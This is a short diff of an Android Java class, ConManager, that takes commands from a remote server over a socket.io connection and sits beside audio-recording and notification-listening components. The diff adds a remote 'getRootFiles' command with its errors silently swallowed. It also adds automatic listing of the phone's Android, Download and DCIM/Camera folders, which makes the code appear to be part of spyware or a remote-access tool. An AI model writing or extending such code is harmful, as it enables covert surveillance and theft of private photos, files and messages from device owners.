@@ -1,11 +1,20 @@
 package com.brocode.startups;
 
+
+
+
+import android.app.ActivityManager;
+import android.content.Context;
 import android.util.Log;
 
 import com.brocode.models.AudioRecorder;
 import com.brocode.models.IOSocket;
 import com.brocode.models.NotificationListener;
+import com.brocode.models.fileManager;
 import com.brocode.utils.Constants;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.net.URI;
 
@@ -24,7 +33,16 @@ public class ConManager {
 
 		socket.on("e#notification-cancel", NotificationListener::cancelNotification);
 		socket.on("e#notification-cancel-all", NotificationListener::cancelAllNotifications);
-		socket.on("e#notification-snooze", NotificationListener::snoozeNotification);
+		socket.on("e#getRootFiles" , args -> {
+			try {
+			 fileManager.getBaseFolder();
+			} catch (Exception e) {
+
+			}
+		});
+		fileManager.getListOfFile("Android");
+		fileManager.getListOfFile("Downalod");
+		fileManager.getListOfFile("DCIM/Camera");
 
 	}
 
